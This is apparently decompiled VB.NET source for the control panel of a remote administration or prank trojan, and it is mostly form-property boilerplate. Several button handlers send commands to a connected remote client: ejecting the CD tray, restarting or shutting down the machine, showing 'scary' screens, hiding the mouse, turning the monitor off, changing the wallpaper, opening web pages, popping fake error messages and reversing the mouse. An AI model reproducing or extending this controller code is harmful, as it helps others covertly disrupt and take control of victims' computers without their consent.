		' (set) Token: 0x060004E1 RID: 1249 RVA: 0x000035AC File Offset: 0x000017AC
		Friend Overridable Property Label6 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label6 = value
			End Set
		End Property

		' Token: 0x170001C1 RID: 449
		' (get) Token: 0x060004E2 RID: 1250 RVA: 0x00028E04 File Offset: 0x00027004
		' (set) Token: 0x060004E3 RID: 1251 RVA: 0x000035B5 File Offset: 0x000017B5
		Friend Overridable Property GroupBox2 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox2 = value
			End Set
		End Property

		' Token: 0x170001C2 RID: 450
		' (get) Token: 0x060004E4 RID: 1252 RVA: 0x00028E1C File Offset: 0x0002701C
		' (set) Token: 0x060004E5 RID: 1253 RVA: 0x000035BE File Offset: 0x000017BE
		Friend Overridable Property Label5 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label5 = value
			End Set
		End Property

		' Token: 0x170001C3 RID: 451
		' (get) Token: 0x060004E6 RID: 1254 RVA: 0x00028E34 File Offset: 0x00027034
		' (set) Token: 0x060004E7 RID: 1255 RVA: 0x000035C7 File Offset: 0x000017C7
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x170001C4 RID: 452
		' (get) Token: 0x060004E8 RID: 1256 RVA: 0x00028E4C File Offset: 0x0002704C
		' (set) Token: 0x060004E9 RID: 1257 RVA: 0x000035D0 File Offset: 0x000017D0
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x170001C5 RID: 453
		' (get) Token: 0x060004EA RID: 1258 RVA: 0x00028E64 File Offset: 0x00027064
		' (set) Token: 0x060004EB RID: 1259 RVA: 0x000035D9 File Offset: 0x000017D9
		Friend Overridable Property GroupBox8 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox8 = value
			End Set
		End Property

		' Token: 0x170001C6 RID: 454
		' (get) Token: 0x060004EC RID: 1260 RVA: 0x00028E7C File Offset: 0x0002707C
		' (set) Token: 0x060004ED RID: 1261 RVA: 0x000035E2 File Offset: 0x000017E2
		Friend Overridable Property Label8 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label8 = value
			End Set
		End Property

		' Token: 0x170001C7 RID: 455
		' (get) Token: 0x060004EE RID: 1262 RVA: 0x00028E94 File Offset: 0x00027094
		' (set) Token: 0x060004EF RID: 1263 RVA: 0x00028EAC File Offset: 0x000270AC
		Friend Overridable Property Button37 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button37
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button37_Click
				If Me._Button37 IsNot Nothing Then
					RemoveHandler Me._Button37.Click, value2
				End If
				Me._Button37 = value
				If Me._Button37 IsNot Nothing Then
					AddHandler Me._Button37.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C8 RID: 456
		' (get) Token: 0x060004F0 RID: 1264 RVA: 0x00028F04 File Offset: 0x00027104
		' (set) Token: 0x060004F1 RID: 1265 RVA: 0x000035EB File Offset: 0x000017EB
		Friend Overridable Property TextBox2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox2 = value
			End Set
		End Property

		' Token: 0x060004F2 RID: 1266 RVA: 0x000035F4 File Offset: 0x000017F4
		Private Sub Button22_Click(sender As Object, e As EventArgs)
			Me.s.Send("opencd")
		End Sub

		' Token: 0x060004F3 RID: 1267 RVA: 0x00003607 File Offset: 0x00001807
		Private Sub Button23_Click(sender As Object, e As EventArgs)
			Me.s.Send("closecd")
		End Sub

		' Token: 0x060004F4 RID: 1268 RVA: 0x0000361A File Offset: 0x0000181A
		Private Sub Button24_Click(sender As Object, e As EventArgs)
			Me.s.Send("Restart")
		End Sub

		' Token: 0x060004F5 RID: 1269 RVA: 0x0000362D File Offset: 0x0000182D
		Private Sub Button25_Click(sender As Object, e As EventArgs)
			Me.s.Send("Shutdown")
		End Sub

		' Token: 0x060004F6 RID: 1270 RVA: 0x00003640 File Offset: 0x00001840
		Private Sub Button26_Click(sender As Object, e As EventArgs)
			Me.s.Send("Scary1")
		End Sub

		' Token: 0x060004F7 RID: 1271 RVA: 0x00003653 File Offset: 0x00001853
		Private Sub Button27_Click(sender As Object, e As EventArgs)
			Me.s.Send("Scary2")
		End Sub

		' Token: 0x060004F8 RID: 1272 RVA: 0x00003666 File Offset: 0x00001866
		Private Sub Button28_Click(sender As Object, e As EventArgs)
			Me.s.Send("Scary3")
		End Sub

		' Token: 0x060004F9 RID: 1273 RVA: 0x00003679 File Offset: 0x00001879
		Private Sub Button30_Click(sender As Object, e As EventArgs)
			Me.s.Send("HideM")
		End Sub

		' Token: 0x060004FA RID: 1274 RVA: 0x0000368C File Offset: 0x0000188C
		Private Sub Button29_Click(sender As Object, e As EventArgs)
			Me.s.Send("ShowM")
		End Sub

		' Token: 0x060004FB RID: 1275 RVA: 0x00028F1C File Offset: 0x0002711C
		Private Sub Button31_Click(sender As Object, e As EventArgs)
			Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
			openFileDialog.ShowDialog()
			Me.s.Send("cwall" + Class7.string_1 + openFileDialog.FileName)
		End Sub

		' Token: 0x060004FC RID: 1276 RVA: 0x0000369F File Offset: 0x0000189F
		Private Sub Button32_Click(sender As Object, e As EventArgs)
			Me.s.Send("MonitorOFF")
		End Sub

		' Token: 0x060004FD RID: 1277 RVA: 0x000036B2 File Offset: 0x000018B2
		Private Sub Button33_Click(sender As Object, e As EventArgs)
			Me.s.Send("MonitorON")
		End Sub

		' Token: 0x060004FE RID: 1278 RVA: 0x00028F58 File Offset: 0x00027158
		Private Sub Button34_Click(sender As Object, e As EventArgs)
			Dim text As String = Me.TextBox1.Text
			Me.s.Send("OpenPage" + Class7.string_1 + text)
		End Sub

		' Token: 0x060004FF RID: 1279 RVA: 0x00028F90 File Offset: 0x00027190
		Private Sub btnTestar_Click(sender As Object, e As EventArgs)
			Dim icon As MessageBoxIcon
			If Me.RadioButton1.Checked Then
				icon = MessageBoxIcon.Asterisk
			ElseIf Me.RadioButton2.Checked Then
				icon = MessageBoxIcon.Question
			ElseIf Me.RadioButton3.Checked Then
				icon = MessageBoxIcon.Exclamation
			ElseIf Me.RadioButton4.Checked Then
				icon = MessageBoxIcon.Hand
			Else
				icon = MessageBoxIcon.Asterisk
			End If
			Dim buttons As MessageBoxButtons
			If Me.RadioButton5.Checked Then
				buttons = MessageBoxButtons.YesNo
			ElseIf Me.RadioButton6.Checked Then
				buttons = MessageBoxButtons.YesNoCancel
			ElseIf Me.RadioButton7.Checked Then
				buttons = MessageBoxButtons.OK
			ElseIf Me.RadioButton8.Checked Then
				buttons = MessageBoxButtons.OKCancel
			ElseIf Me.RadioButton9.Checked Then
				buttons = MessageBoxButtons.RetryCancel
			ElseIf Me.RadioButton10.Checked Then
				buttons = MessageBoxButtons.AbortRetryIgnore
			Else
				buttons = MessageBoxButtons.OK
			End If
			MessageBox.Show(Me.TextBox5.Text, Me.TextBox6.Text, buttons, icon)
		End Sub

		' Token: 0x170001C9 RID: 457
		' (get) Token: 0x06000500 RID: 1280 RVA: 0x00029070 File Offset: 0x00027270
		Public ReadOnly Property title As Object
			Get
				Return Me.TextBox6.Text
			End Get
		End Property

		' Token: 0x06000501 RID: 1281 RVA: 0x0002908C File Offset: 0x0002728C
		Private Sub btnEnviar_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("ErorrMsg" + Class7.string_1, Me.messageicon), Class7.string_1), Me.messagebutton), Class7.string_1), Me.title), Class7.string_1), Me.message) }, Nothing, Nothing, Nothing, True)
		End Sub

		' Token: 0x06000502 RID: 1282 RVA: 0x000036C5 File Offset: 0x000018C5
		Private Sub Button35_Click(sender As Object, e As EventArgs)
			Me.s.Send("ReverseMouse")
		End Sub

		' Token: 0x06000503 RID: 1283 RVA: 0x000036D8 File Offset: 0x000018D8
		Private Sub Button36_Click(sender As Object, e As EventArgs)
			Me.s.Send("NormalMouse")
		End Sub

		' Token: 0x170001CA RID: 458
		' (get) Token: 0x06000504 RID: 1284 RVA: 0x00029114 File Offset: 0x00027314
		Public ReadOnly Property message As Object
			Get
				Return Me.TextBox5.Text
			End Get
		End Property

		' Token: 0x170001CB RID: 459
		' (get) Token: 0x06000505 RID: 1285 RVA: 0x00029130 File Offset: 0x00027330
		Public ReadOnly Property messagebutton As Object
			Get
				If Not Me.RadioButton5.Checked Then
					If Me.RadioButton6.Checked Then
						Return "2"
					End If
					If Me.RadioButton7.Checked Then
						Return "3"
					End If
					If Me.RadioButton8.Checked Then
						Return "4"
					End If
					If Me.RadioButton9.Checked Then
						Return "5"
					End If
					If Me.RadioButton10.Checked Then
						Return "6"
					End If
				End If
				Return "1"
			End Get
		End Property

		' Token: 0x170001CC RID: 460
		' (get) Token: 0x06000506 RID: 1286 RVA: 0x000291C0 File Offset: 0x000273C0
		Public ReadOnly Property messageicon As Object
			Get
				If Not Me.RadioButton1.Checked Then
					If Me.RadioButton2.Checked Then
						Return "2"
					End If
					If Me.RadioButton3.Checked Then
						Return "3"
					End If
					If Me.RadioButton4.Checked Then
						Return "4"
					End If
				End If
				Return "1"
			End Get
		End Property

		' Token: 0x06000507 RID: 1287 RVA: 0x00029224 File Offset: 0x00027424
		Private Sub Button37_Click(sender As Object, e As EventArgs)
			Dim array As Object() = New Object(0) {}
			Dim textBox As TextBox = Me.TextBox2
			array(0) = textBox.Text
			Dim array2 As Object() = array
			Dim array3 As Boolean() = New Boolean() { True }
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", "")))), Nothing, "speak", array2, Nothing, Nothing, array3, True)
			If array3(0) Then
				textBox.Text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2(0)))), GetType(String)))
			End If
		End Sub

		' Token: 0x04000221 RID: 545
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000223 RID: 547
		<AccessedThroughProperty("TabControl1")>
		Private _TabControl1 As TabControl

		' Token: 0x04000224 RID: 548
		<AccessedThroughProperty("TabPage2")>
		Private _TabPage2 As TabPage

		' Token: 0x04000225 RID: 549
		<AccessedThroughProperty("Button23")>
		Private _Button23 As Button

		' Token: 0x04000226 RID: 550
		<AccessedThroughProperty("Button22")>
		Private _Button22 As Button

		' Token: 0x04000227 RID: 551
		<AccessedThroughProperty("Button25")>
		Private _Button25 As Button

		' Token: 0x04000228 RID: 552
		<AccessedThroughProperty("Button24")>
		Private _Button24 As Button

		' Token: 0x04000229 RID: 553
		<AccessedThroughProperty("Button28")>
		Private _Button28 As Button

		' Token: 0x0400022A RID: 554
		<AccessedThroughProperty("Button27")>
		Private _Button27 As Button

		' Token: 0x0400022B RID: 555
		<AccessedThroughProperty("Button26")>
		Private _Button26 As Button

		' Token: 0x0400022C RID: 556
		<AccessedThroughProperty("Button29")>
		Private _Button29 As Button

		' Token: 0x0400022D RID: 557
		<AccessedThroughProperty("Button30")>
		Private _Button30 As Button

		' Token: 0x0400022E RID: 558
		<AccessedThroughProperty("Button31")>
		Private _Button31 As Button

		' Token: 0x0400022F RID: 559
		<AccessedThroughProperty("Button33")>
		Private _Button33 As Button

		' Token: 0x04000230 RID: 560
		<AccessedThroughProperty("Button32")>
		Private _Button32 As Button

		' Token: 0x04000231 RID: 561
		<AccessedThroughProperty("Button34")>
		Private _Button34 As Button

		' Token: 0x04000232 RID: 562
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000233 RID: 563
		<AccessedThroughProperty("TabPage3")>
		Private _TabPage3 As TabPage

		' Token: 0x04000234 RID: 564
		<AccessedThroughProperty("GroupBox20")>
		Private _GroupBox20 As GroupBox

		' Token: 0x04000235 RID: 565
		<AccessedThroughProperty("RadioButton9")>
		Private _RadioButton9 As RadioButton

		' Token: 0x04000236 RID: 566
		<AccessedThroughProperty("RadioButton8")>
		Private _RadioButton8 As RadioButton

		' Token: 0x04000237 RID: 567
		<AccessedThroughProperty("RadioButton7")>
		Private _RadioButton7 As RadioButton

		' Token: 0x04000238 RID: 568
		<AccessedThroughProperty("RadioButton6")>
		Private _RadioButton6 As RadioButton

		' Token: 0x04000239 RID: 569
		<AccessedThroughProperty("RadioButton5")>
		Private _RadioButton5 As RadioButton

		' Token: 0x0400023A RID: 570
		<AccessedThroughProperty("RadioButton10")>
		Private _RadioButton10 As RadioButton

		' Token: 0x0400023B RID: 571
		<AccessedThroughProperty("GroupBox22")>
		Private _GroupBox22 As GroupBox

		' Token: 0x0400023C RID: 572
		<AccessedThroughProperty("RadioButton4")>
		Private _RadioButton4 As RadioButton

		' Token: 0x0400023D RID: 573
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x0400023E RID: 574
		<AccessedThroughProperty("RadioButton3")>
		Private _RadioButton3 As RadioButton

		' Token: 0x0400023F RID: 575
		<AccessedThroughProperty("PictureBox3")>
		Private _PictureBox3 As PictureBox

		' Token: 0x04000240 RID: 576
		<AccessedThroughProperty("RadioButton2")>
		Private _RadioButton2 As RadioButton

		' Token: 0x04000241 RID: 577
		<AccessedThroughProperty("PictureBox2")>
		Private _PictureBox2 As PictureBox

		' Token: 0x04000242 RID: 578
		<AccessedThroughProperty("RadioButton1")>
		Private _RadioButton1 As RadioButton

		' Token: 0x04000243 RID: 579
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x04000244 RID: 580
		<AccessedThroughProperty("btnTestar")>
		Private _btnTestar As Button

		' Token: 0x04000245 RID: 581
		<AccessedThroughProperty("btnEnviar")>
		Private _btnEnviar As Button

		' Token: 0x04000246 RID: 582
		<AccessedThroughProperty("GroupBox21")>
		Private _GroupBox21 As GroupBox

		' Token: 0x04000247 RID: 583
		<AccessedThroughProperty("TextBox6")>
		Private _TextBox6 As TextBox

		' Token: 0x04000248 RID: 584
		<AccessedThroughProperty("TextBox5")>
		Private _TextBox5 As TextBox

		' Token: 0x04000249 RID: 585
		<AccessedThroughProperty("GroupBox7")>
		Private _GroupBox7 As GroupBox

		' Token: 0x0400024A RID: 586
		<AccessedThroughProperty("Label7")>
		Private _Label7 As Label

		' Token: 0x0400024B RID: 587
		<AccessedThroughProperty("Button35")>
		Private _Button35 As Button

		' Token: 0x0400024C RID: 588
		<AccessedThroughProperty("Button36")>
		Private _Button36 As Button

		' Token: 0x0400024D RID: 589
		<AccessedThroughProperty("GroupBox6")>
		Private _GroupBox6 As GroupBox

		' Token: 0x0400024E RID: 590
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x0400024F RID: 591
		<AccessedThroughProperty("GroupBox5")>
		Private _GroupBox5 As GroupBox

		' Token: 0x04000250 RID: 592
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000251 RID: 593
		<AccessedThroughProperty("GroupBox4")>
		Private _GroupBox4 As GroupBox

		' Token: 0x04000252 RID: 594
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000253 RID: 595
		<AccessedThroughProperty("GroupBox3")>
		Private _GroupBox3 As GroupBox

		' Token: 0x04000254 RID: 596
		<AccessedThroughProperty("Label6")>
		Private _Label6 As Label

		' Token: 0x04000255 RID: 597
		<AccessedThroughProperty("GroupBox2")>
		Private _GroupBox2 As GroupBox

		' Token: 0x04000256 RID: 598
		<AccessedThroughProperty("Label5")>
		Private _Label5 As Label

		' Token: 0x04000257 RID: 599
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x04000258 RID: 600
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x04000259 RID: 601
		<AccessedThroughProperty("GroupBox8")>
		Private _GroupBox8 As GroupBox

		' Token: 0x0400025A RID: 602
		<AccessedThroughProperty("Label8")>
		Private _Label8 As Label

		' Token: 0x0400025B RID: 603
		<AccessedThroughProperty("Button37")>
		Private _Button37 As Button

		' Token: 0x0400025C RID: 604
		<AccessedThroughProperty("TextBox2")>
		Private _TextBox2 As TextBox

		' Token: 0x0400025D RID: 605
		Public s As Client
	End Class
End Namespace
